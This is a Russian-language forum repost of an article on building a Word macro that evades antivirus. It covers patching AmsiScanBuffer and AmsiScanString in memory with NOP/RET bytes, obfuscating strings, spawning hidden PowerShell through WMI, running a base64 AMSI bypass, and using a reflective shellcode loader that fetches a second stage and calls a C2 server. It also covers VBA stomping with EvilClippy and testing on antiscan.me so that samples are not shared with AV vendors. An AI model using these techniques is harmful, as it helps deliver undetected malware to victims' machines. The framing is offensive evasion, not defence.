Начать Брендан решил с импорта функций. Чтобы пропатчить AMSI в памяти, необходим доступ к некоторым низкоуровневым библиотекам и функциям Windows. В VBA разрешено импортировать API Windows для использования в макросе. Такая возможность радикально расширяет функционал VBA.<br />
<br />
Злоумышленник, вызывая определенные API Windows из VBA, C#, PowerShell и т. д., должен хорошенько в них разобраться, чтобы все сделать правильно. Дело в том, что нативные функции для этих целей в соответствующих языках отсутствуют. Но вооружившись некоторыми «подготовительными знаниями», заполнить эти пробелы довольно легко. Когда ты знаешь, какие API Windows хочешь импортировать, для начала обязательно погугли соответствующую документацию Microsoft. Там ты найдешь подробную информацию об интересующей тебя функции, в частности, каковы ее возвращаемые значения, какие параметры она принимает, в какой DLL находится интересующий тебя API и т. д. Так ты получишь по‑настоящему хорошее представление о событиях, происходящих «под капотом» скрипта.<br />
<br />
Брендан использовал в своем макросе объявление PInvoke (Platform-Invoke, «Платформенный вызов»). PInvoke – это коллекция определений для вызова нативных функций API Windows из языков программирования, в которых может отсутствовать такой низкоуровневый функционал. Особенности работы этого инструмента подробно описаны <a href="https://pinvoke.net/" target="_blank" class="link link--external" rel="noopener">вот на этом сайте</a>. Там можно найти декларации для импорта API в различные сценарии на все случаи жизни.<br />
<br />
<b>Обход AMSI</b><br />
<br />
Импорт необходимых API Windows в VBA — это только первый шаг. Чтобы придуманный Бренданом Ортизом скрипт работал, нужно обойти AMSI. Для этого исследователь решил пропатчить AMSI прямо в памяти. А конкретнее, пропатчить первые несколько байтов в функциях AmsiScanBuffer и AmsiScanString из библиотеки Amsi.dll, загружаемой из запущенного процесса. Эти функции, если верить документации Microsoft, отвечают за сканирование содержимого буфера в поисках характерных для малвари строк.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="05.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26879%2F05.png&amp;hash=dacee9c03c6809657d238b9b9287aa41" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../05de99.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26879%2F05.png&amp;hash=dacee9c03c6809657d238b9b9287aa41"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26879/05.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="05.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
Сначала объявляется список указателей переменных для хранения адресов функций. Затем в переменной lib сохраняется адрес из библиотеки amsi.dll, это делается при помощи направляемого к API Windows вызова LoadLib. Все строки в этом патче памяти AMSI должны быть обфусцированы. На первом этапе автор скрипта использовал для этого функцию VBA Chr(), чтобы скрыть некоторые характерные строки вроде amsi.dLl и AmsiUacInitialize.<br />
<br />
Затем нужно найти, где лежит функция AmsiScanString. Для этого Брендан использовал функцию Windows API GetProcAddress, переименованную в GetPrAddr. Поскольку AMSI еще не пропатчен, а вредоносы часто пытаются отключить его, нацеливаясь на функции  AmsiScanString и AmsiScanBuffer, автор скрипта воспользовался относительной адресацией начиная с функции AmsiUacInitialize.<br />
<br />
Для начала Брендан вычел 96 из адреса функции AmsiUacInitialize и сохранил результат в переменной func_addr. Затем вызвал GetPrAddr со строками‑аргументами, первая из которых – это адрес amsi.dll, а вторая – строка AmsiUacInitialize, к которой применена обфускация. Зачем вычитать 96? Всё очень просто: Брендан прошелся по процессу Microsoft Word отладчиком WinDbg и выяснил, что  адрес функции AmsiScanString отстоит на 96 байтов от функции AmsiUacInitialize.<br />
<br />
Если просмотреть в WinDbg содержимое загруженной в память библиотеки AMSI.dll начиная с функции AmsiScanBuffer, расположенной по адресу 0x100 в шестнадцатеричной системе (256 байтов в десятичной), то можно увидеть, как выглядит верхняя часть вывода.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="06.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26880%2F06.png&amp;hash=c2ebf9b2df56ea028f3216876ddd7e84" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../06ae1a.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26880%2F06.png&amp;hash=c2ebf9b2df56ea028f3216876ddd7e84"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26880/06.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="06.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
Стрелка указывает на первые опкоды в функции AmsiScanBuffer, а слева показан ассоциированный с этой инструкцией адрес в памяти: 0x00007ffa054f35e0. Следовательно, функция AmsiScanBuffer начинается именно в этой точке. Изучив вывод далее, можно найти следующую функцию — AmsiScanString, и выяснить ее адрес: 0x00007ffa054f36e0.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="07.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26881%2F07.png&amp;hash=bfaffd9357dfa76853068544ade00c78" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../073e60.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26881%2F07.png&amp;hash=bfaffd9357dfa76853068544ade00c78"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26881/07.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="07.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
Далее  Брендан отыскал в выводе отладчика значение переменной func_addr, которую загрузил в свой макрос VBA при помощи функции GetPrAddr. В этой переменной находится адрес функции AmsiUacInitialize: 0x00007ffa054f3740.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="08.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26882%2F08.png&amp;hash=99f65c48e29841f6cfd3f827c42da6a4" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../089e22.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26882%2F08.png&amp;hash=99f65c48e29841f6cfd3f827c42da6a4"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26882/08.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="08.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
Все, что осталось сделать автору скрипта, — это просто вычесть из адреса функции AmsiUacInitialize адреса функций AmsiScanString и AmsiScanBuffer. Так будут получены относительные адреса последних.<br />
<br />
0x054f3740 (AmsiUacInitialize Start Address) - 0x054f36e0 (AmsiScanString Start Address) = 0x60 = 96 bytes<br />
0x054f3740 (AmsiUacInitialize Start Address) - 0x54f35e0 (AmsiScanBuffer Start Address) = 0x160 = 352 bytes<br />
<br />
Следующая часть созданного Бренданом Ортизом макроса меняет защитные механизмы памяти и порядок доступа к ней целевых функций. Это делается при помощи API-функции VirtualProtect, которую автор переименовал в VirtPro.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="09.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26883%2F09.png&amp;hash=bfe681621c119ab19844412ba5e2a35d" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../09693a.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26883%2F09.png&amp;hash=bfe681621c119ab19844412ba5e2a35d"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26883/09.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="09.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
Функция VirtualProtect меняет характеристики защиты в области виртуальной памяти, которая относится к адресному пространству вызывающего процесса. С ее помощью можно изменить показатели защиты для конкретного участка памяти (с атрибутами «только для чтения» или «для исполнения»), в результате чего появляется возможность редактировать расположенные там инструкции.<br />
<br />
VirtualProtect принимает следующие параметры: адрес того места, которое нужно отредактировать (это адрес интересующей нас функции), размер области памяти, которую требуется редактировать (32 байта от начала адреса), уровни защиты памяти, которые требуется обеспечить (передается в виде значения, которое будет обрабатываться при помощи побитовой операции AND). Наконец, в сценарии содержится переменная flOldProtection. Функция сохраняет в эту переменную старое значение параметров защиты памяти – для последующего использования.<br />
<br />
Получив доступ к чтению и записи тех областей памяти, что предназначены только для записи, Брендан перешел непосредственно к пропатчиванию AMSI. Для этого он использовал WinAPI-функцию RtlFillMemory. Такие функции, как RtlMoveMemory, часто используются вредоносами, поэтому легко обнаруживаются эвристикой антивирусов. А вот RtlFillMemory – не самый частотный вариант, из‑за чего ее могут и не сэмулировать движки, работа которых основана на эвристике. Да и при статическом анализе антивирусы далеко не всегда обращают на нее внимание. Брендан переименовал эту функцию в patcher.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="10.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26884%2F10.png&amp;hash=f30cb251bf641bbff828ecb45cc7340d" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../10a709.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26884%2F10.png&amp;hash=f30cb251bf641bbff828ecb45cc7340d"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26884/10.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="10.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
В скрипте выполняется вызов функции RtlFillMemory по псевдониму patcher, ей передаются адреса функций AmsiScanString и AmsiScanBuffer. Затем нужно указать, сколько байтов требуется заполнить, и, наконец, передать шестнадцатеричное значение кода операции, которое требуется туда добавить: 0x90  — это код NOP, он ничего не делает. Затем выполняется то же действие, но с увеличением адреса на 1, при этом функции передается код операции return, который равен 0xc3.<br />
<br />
В результате в начале функции AmsiScanString будет поставлен неоперационный код 0x90, а после него – код возврата 0xC3, и эта функция просто завершится сразу после того, как будет вызвана, что позволит обойти AMSI в VBA. Вот как выглядит выполнение функции AmsiScanString после применения патча в отладчике WinDbg.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="11.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26885%2F11.png&amp;hash=ffb75554b5fd98c4aaf39288188eaf1a" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../114f24.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26885%2F11.png&amp;hash=ffb75554b5fd98c4aaf39288188eaf1a"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26885/11.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="11.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
Все, что остается – повторить весь процесс для функции AmsiScanBuffer, смещение для которой уже известно. Тут стоит отметить, что есть и более изощренные способы сделать это, например, динамически искать начальные байты каждой функции, как только адрес Amsi.dll будет загружен в память.  Кроме того, есть некоторые отличия в процессе патча библиотеки в 32-разрядной и 64-разрядной версиях Word.<br />
<br />
На некоторых сайтах можно встретить описания способов обхода AMSI на VBA с использованием совершенно иных, альтернативных методов, не требующих взаимодействия с API Windows. Правда, некоторые из них требуют записывать на диск файлы и с этим можно влипнуть. Примеры на эту тему можно найти в следующем <a href="https://github.com/outflanknl/Scripts/blob/master/AMSIbypasses.vba" target="_blank" class="link link--external" rel="noopener">Git-репозитории</a>.<br />
<br />
<b>Обфускация строк</b><br />
<br />
Поскольку созданный Бренданом Ортизом VBA-скрипт использует WMI-объект для порождения процесса PowerShell, он неизбежно привлечет повышенное внимание любого антивирусного движка. Наиболее очевидным решением этой проблемы является шифрование статических строк внутри макроса.<br />
<br />
Например, при создании объекта WMI используются такие строки, как winmgmts:, Win32_ProcessStartup, Win32_Process и им подобные. При статическом сканировании макроса эти строки будут идеальными мишенями для антивируса, он просто неизбежно пометит их как вредоносные. Брендан использовал следующий метод обфускации.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="12.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26886%2F12.png&amp;hash=662691a838c390ca0fb07bbf75ec80c5" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../1245f2.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26886%2F12.png&amp;hash=662691a838c390ca0fb07bbf75ec80c5"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26886/12.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="12.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
Он объявил переменную, в которой будут сохраняться статические строки, присутствующие в макросе VBA. Затем он объявил выходную переменную, в которой будет содержаться зашифрованная строка. После этого он преобразовал полезную нагрузку из строковой переменной в символьный массив. Затем десятичное значение каждого символа суммируется со значением 26. Далее он забил символ дополнительными нулями, чтобы позже, в процессе деобфускации VBA, получились предсказуемые 3-символьные значения. Если длина вывода составляет 1 символ, то к нему добавляется два нуля, если длина – два символа, добавляется один ноль, а если три символа, ничего не добавляется.<br />
<br />
Таким образом формируется зашифрованная выходная строка, которая отправляется в буфер обмена через конвейер. После запуска скрипта в буфер обмена помещается строка примерно следующего содержания.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="13.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26887%2F13.png&amp;hash=000ebad637be58907a2d94519f3a382f" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../135e6a.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26887%2F13.png&amp;hash=000ebad637be58907a2d94519f3a382f"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26887/13.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="13.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
Деобфусцирующий макрос в VBA выглядит примерно так.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="14.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26888%2F14.png&amp;hash=7bb47f8295e224a177868ebe6df75b95" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../148828.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26888%2F14.png&amp;hash=7bb47f8295e224a177868ebe6df75b95"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26888/14.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="14.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
В скрипте создаются подпрограммы со случайными именами, которые не выдадут антивирусному сканеру, что процедура может быть вредоносной, а также запутают любого аналитика, которому попадет в руки такой макрос. В VBA подпрограмма вызывается при помощи инструкции, которая имеет примерно следующий вид.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="15.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26889%2F15.png&amp;hash=bcf6f96fea0f1365eb9d703848c9ab07" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../15c280.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26889%2F15.png&amp;hash=bcf6f96fea0f1365eb9d703848c9ab07"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26889/15.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="15.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
<br />
Сначала зашифрованная полезная нагрузка поступает в подпрограмму Joy и запускает цикл Do While. Затем она отправляется в подпрограмму Man, извлекающую первые 3 числа (вот зачем понадобилось заполнение нулями), после чего передает эти символы функции bread. Она вычтет 26 из 3 символов, чтобы получить конкретное дешифрованное число. Это число является ASCII-эквивалентом символа и сохраняется в переменной green.<br />
<br />
Далее вся зашифрованная полезная нагрузка отправляется функции rand, которая удаляет из нее первые три символа и сохраняет их обратно в переменную paper. Затем процесс повторяется до тех пор, пока вся полезная нагрузка не редуцируется до нуля.<br />
<br />
Наконец, дешифрованная полезная нагрузка возвращается вызывающей процедуре при помощи инструкции Joy = green.<br />
<br />
<b>Выполнение PowerShell при помощи WMI</b><br />
<br />
Далее необходимо запустить экземпляр процесса PowerShell при помощи WMI. Для этого создается объект WMI посредством вызова функции VBA GetObject с зашифрованной строкой winmgmts:, результат сохраняется в переменной ObjWMIService.<br />
<br />
После этого вызывается функция Get из объекта WMI Service с зашифрованной версией строки Win32_ProcessStartup и сохраняется в переменную objStartup. Это позволяет задать параметры запуска для создаваемого скриптом процесса PowerShell. Следующие действия направлены на то, чтобы спрятать окно PowerShell (для этого значение переменной objConfig.showWindow устанавливается в 0) — пользователь даже не узнает, что в фоновом режиме выполняется какой‑то скрипт.<br />
<br />
Созданному процессу передаются заранее сформированные параметры и настройки в виде нескольких сцепленных строк. Весь ход создания объекта WMIObject выглядит примерно так.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="Выполнение PowerShell при помощи WMI"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26890%2F16.png&amp;hash=920bdfbe13910975e240d443a5a507c6" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../162d0b.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26890%2F16.png&amp;hash=920bdfbe13910975e240d443a5a507c6"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26890/16.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="Выполнение PowerShell при помощи WMI"
			title="Выполнение PowerShell при помощи WMI"
			width="" height="" loading="lazy" />
	</div><br />
<br />
<b>Полезная нагрузка PowerShell</b><br />
<br />
Прежде чем запустить вредоносную команду PowerShell, необходимо отключить AMSI. Поскольку инстанс PowerShell порождается в отдельном процессе, здесь возникает загвоздка с еще одним случаем интеграции AMSI, который придется обойти прежде, чем скрипт начнет какую‑либо вредоносную активность.<br />
<br />
Работа макроса начинается с отключения AMSI в VBA, чтобы во время исполнения система не пометила содержимое макроса как вредоносное.<br />
<br />
Для этого объявляются три разные строки —  str1,str2 и str3, а затем им передается в качестве значения полезная нагрузка, которую нужно прогнать через объект WMI (процесс создания этого объекта был описан выше). Это сделано ради удобочитаемости и пригодности к отладке: разделив полезную нагрузку на фрагменты, можно выявить, где именно она прекращает выполняться.<br />
<br />
Первая строка (str1) получает в качестве нагрузки зашифрованную версию кода:<br />
<br />
<i>Powershell.exe -ep bypass -nop -c</i><br />
<br />
Если не удается создать процесс PowerShell при выполнении макроса, то уже известно, что проблема заключается в первом зашифрованном фрагменте.<br />
<br />
Вторая строка (str2) получает в качестве нагрузки следующий зашифрованный код:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746796137996.png"
		data-src="https://osint42.org/attachments/1746796137996-png.322/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746796137996-png.322/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746796137996.png"
			title="1746796137996.png"
			width="1158" height="142" loading="lazy" />
	</div><br />
<br />
Эта строка – зашифрованный обход AMSI. Шифрование выполнено по основанию 64, так как при переводе с VBA на PowerShell могут возникнуть проблемы при передаче специальных символов. В декодированном виде обход укладывается в одну строку, а в несвернутом выглядит примерно так.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="17.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26891%2F17.png&amp;hash=4a2bb0da39bad46e9a143ae65593355e" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../1749e9.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26891%2F17.png&amp;hash=4a2bb0da39bad46e9a143ae65593355e"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26891/17.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="17.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
Если будет получено уведомление Microsoft Defender о блокировке скрипта на данном этапе, станет очевидно, что обход не удался. Если не удастся установить соединение с веб‑сервером для скачивания полезной нагрузки, но сам скрипт PowerShell запустится успешно, это также будет означать, что проблема возникла именно здесь.<br />
<br />
Третья строка (str3) получает в качестве нагрузки такой код:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746796149158.png"
		data-src="https://osint42.org/attachments/1746796149158-png.323/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746796149158-png.323/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746796149158.png"
			title="1746796149158.png"
			width="512" height="50" loading="lazy" />
	</div><br />
<br />
Так извлекается первая часть полезной нагрузки, загрузчик шелл‑кода, который будет загружать байт‑код со стадии 2 и выполнять его непосредственно в памяти.<br />
<br />
<b>Загрузчик шелл-кода</b><br />
<br />
После запуска из PowerShell скрипт скачивает сгенерированный шелл‑код, а затем, воспользовавшись рефлексией, загружает функции Windows API, эквивалентные VirtualAlloc, CreateThread и WaitForSingleObject.<br />
<br />
Сгенерированный шелл‑код использует загруженные API Windows, чтобы выполнить код в текущем процессе PowerShell. Это и называется рефлексией, в ходе нее функции создаются и загружаются в память. Есть причина, по которой нужно действовать именно так, а не использовать, например, <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2&amp;viewFallbackFrom=powershell-7.1" target="_blank" class="link link--external" rel="noopener">функцию add-type</a> из арсенала PowerShell.<br />
<br />
Дело в том, что Add-Type создает временный файл и сохраняет его на диск. Такой файл – это артефакт, по которому вирусный аналитик может догадаться, что в системе происходит что‑то нехорошее. Кроме того, такой файл может быть замечен и просканирован антивирусными движками, когда он уже сохранен на диск.<br />
<br />
В итоге, созданный Бренданом Ортизом скрипт принял следующий вид:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746796162478.png"
		data-src="https://osint42.org/attachments/1746796162478-png.324/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746796162478-png.324/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746796162478.png"
			title="1746796162478.png"
			width="1129" height="601" loading="lazy" />
	</div><br />
<br />
При исполнении шелл‑код выполняет обратный вызов к серверу C2, а затем возвращает управление шелл‑коду.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="18.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26892%2F18.png&amp;hash=cc70e8bb6bd9db992c8a171b9bf681ad" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../18fc5e.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26892%2F18.png&amp;hash=cc70e8bb6bd9db992c8a171b9bf681ad"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26892/18.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="18.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
<b>Стомпинг VBA</b><br />
<br />
Остается последний этап — стомпинг VBA. Это акт удаления частично сжатой версии исходного кода VBA, сохраненного в документе – так, что остается только предварительно скомпилированный код. Когда документ открывают на целевой машине в той же версии Word, для которой создавался скрипт, код VBA не компилируется заново — вместо этого выполняется сохраненный макрос VBA.<br />
<br />
Таким образом, если нам заблаговременно известно, с какой версией VBA будет выполняться наш макрос, мы можем удалить из документа исходный код и оставить только скомпилированный. Благодаря этому радикально сужается возможность анализа кода и снижается вероятность его обнаружения антивирусом.<br />
<br />
Для такой работы особенно хорош <a href="https://github.com/outflanknl/EvilClippy" target="_blank" class="link link--external" rel="noopener">инструмент EvilClippy</a>, который даже позволяет заменить нескомпилированный макрос VBA безвредной версией VBA-кода. Таким образом, ты можешь заменить вредоносный макрос на код, который пишет &quot;Hello World!&quot;.  Когда документ будет открыт, выполнится и вредоносный макрос, если версия Office – именно та, для которой он компилировался. Все вышеперечисленное EvilClippy может выполнить при помощи единственной строки кода, выглядящей примерно так:<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746796177584.png"
		data-src="https://osint42.org/attachments/1746796177584-png.325/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746796177584-png.325/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746796177584.png"
			title="1746796177584.png"
			width="612" height="57" loading="lazy" />
	</div><br />
<br />
В результате выполнения команды в папке с исходным файлом создается новый документ, к имени которого добавлена строка _EvilClippy.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="Так работает EvilClippy"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26893%2F19.png&amp;hash=ffe4d7639be9f74c525460b5cb4e2daf" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../191b33.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26893%2F19.png&amp;hash=ffe4d7639be9f74c525460b5cb4e2daf"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26893/19.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="Так работает EvilClippy"
			title="Так работает EvilClippy"
			width="" height="" loading="lazy" />
	</div><br />
<br />
Обрати внимание, насколько два этих файла отличаются по размеру. Теперь остается только загрузить вредоносный документ на <a href="http://antiscan.me/" target="_blank" class="link link--external" rel="noopener">antiscan.me</a> и посмотреть, сколько антивирусных движков распознают его как вредоносный. В данном случае обязательно пользоваться antiscan.me, а не VirusTotal, поскольку первый из этих двух сайтов не передает  вредоносную нагрузку антивирусным компаниям для ее добавления в базы сигнатур.<br />
<br />
<b>Выводы</b><br />
<br />
А вот и результат!<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="20.png"
		data-src="/proxy.php?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26894%2F20.png&amp;hash=0b941ce1a68ef6c0d51d7788fcf95e43" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../209b6d.png?image=https%3A%2F%2Fstatic.xakep.ru%2Fimages%2F5566915d365e8669c6db764c9400b737%2F26894%2F20.png&amp;hash=0b941ce1a68ef6c0d51d7788fcf95e43"
			data-url="../../../static.xakep.ru/images/5566915d365e8669c6db764c9400b737/26894/20.png"
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="20.png"
			title=""
			width="" height="" loading="lazy" />
	</div><br />
<br />
Усилия вознаграждены. Угрозу обнаружили всего 5 из 26 антивирусных движков, и автору скрипта удалось ускользнуть от самых распространенных, таких как Windows Defender, Sophos, Kaspersky и McAfee. С помощью примененных им методов скрипту удалось отключить AMSI и выполнить вредоносный VBA-скрипт на машине, защищенной Windows Defender.</div>
						

							<h2>Обход AMSI при помощи хардварных точек останова</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746796254998.png"
		data-src="https://osint42.org/attachments/1746796254998-png.326/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746796254998-png.326/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746796254998.png"
			title="1746796254998.png"
			width="1024" height="1024" loading="lazy" />
	</div><br />
<br />
<b>AMSI (Antimalware Scan Interface)</b> — это интерфейс, предоставляемый Microsoft, который позволяет приложениям и службам отправлять данные на сканирование антивирусными решениями, установленными на системе. С AMSI разработчики могут лучше интегрироваться с антивирусными решениями и обеспечивать более высокий уровень безопасности для своих пользователей.<br />
<br />
<b>Обход <b>AMSI </b> с использованием хардверных брейкпоинтов</b>:<br />
<br />
<b>Хардверные точки останова </b>— это механизм, который позволяет отладчикам &quot;останавливать&quot; выполнение программы при обращении к определенной области памяти. Это может быть полезно при исследовании, как программа или система взаимодействует с конкретными данными.<br />
<br />
В этой статье давайте попробуем перехватить функцию AmsiScanBuffer и изменить в обработчике исключения входные данные в эту функцию, тем самым в антивирусные системы будут попадать не вредоносный код для сканирования, а мусор.)<br />
<br />
